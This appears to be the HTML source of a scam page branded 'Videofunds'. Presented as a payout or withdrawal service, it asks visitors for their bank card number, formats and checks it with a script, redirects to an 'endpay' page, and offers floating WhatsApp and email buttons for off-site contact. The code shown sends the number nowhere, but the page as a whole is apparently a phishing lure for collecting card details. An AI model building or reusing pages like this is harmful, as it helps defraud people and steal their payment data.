<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>User Account</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      background: url('https://www.transparenttextures.com/patterns/white-paper.png');
      background-size: cover;
      margin: 0;
      padding: 0;
    }
    .navbar {
      background-color: #5a0c1a; /* maroon top bar */
    }
    .navbar-brand {
      font-weight: bold;
      font-size: 30px;
      color: blue !important;
    }
    .nav-link {
      color: white !important;
      font-size: 16px;
    }
    .card-input {
      max-width: 400px;
    }
    footer {
      background-color: #333;
      color: white;
      padding: 20px 0;
    }
    /* WhatsApp floating button */
    .whatsapp-button {
      position: fixed;
      left: 15px;
      bottom: 15px;
      background-color: #25D366;
      padding: 10px;
      border-radius: 30px;
      box-shadow: 0px 4px 10px rgba(0,0,0,0.3);
      z-index: 1000;
    }
    .whatsapp-button img {
      width: 30px;
      height: 30px;
    }
    /* Email floating button */
    .email-button {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: darkred;
      color: white;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      font-size: 15px;
      font-family: Arial, sans-serif;
      z-index: 1000;
      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
    .email-button:hover {
      background-color: #a10000;
    }
  </style>
</head>
<body>

  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg fixed-top">
    <div class="container d-flex justify-content-between">
      <a class="navbar-brand" href="#">Videofunds</a>
      <a class="nav-link" href="https://videofundswithdrawal.netlify.app">
        <i class="fa fa-address-card"></i> User area
      </a>
    </div>
  </nav>

  <!-- Main Content -->
  <div class="container" style="margin-top:120px;">
    <div class="row">
      <div class="col text-center">
        <h5 style="color:blue; font-weight:bold;">Enter your bank card number</h5>
      </div>
    </div>
    <div class="row mt-3 mb-3">
      <div class="col d-flex justify-content-center">
        <input type="text" id="nschcard" class="form-control card-input" placeholder="e.g. 1234 5678 4321 6543" maxlength="19">
      </div>
    </div>
    <div class="row">
      <div class="col d-flex justify-content-center">
        <button onclick="dopay()" class="btn btn-success card-input">continue</button>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="text-center mt-5">
    <p class="m-0">Copyright &copy; videofunds.top 2007-2025</p>
  </footer>


  <!-- Validation Script -->
  <script>
    function validateCardNumber(number) {
      // Remove spaces
      let cleaned = number.replace(/\s+/g, '');
      // Must be 16 digits
      return /^\d{16}$/.test(cleaned);
    }

    function dopay() {
      const cardNumber = document.getElementById('nschcard').value;
      if (!validateCardNumber(cardNumber)) {
        alert("Please enter a valid 16-digit card number.");
        return;
      }
      // Success â†’ redirect
      window.location.href = "endpay.html";
    }

    // Auto format card number (1234 5678 ...)
    document.getElementById('nschcard').addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '').substring(0,16);
      let formatted = value.replace(/(.{4})/g, '$1 ').trim();
      e.target.value = formatted;
    });
  </script>

  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</body>
</html>
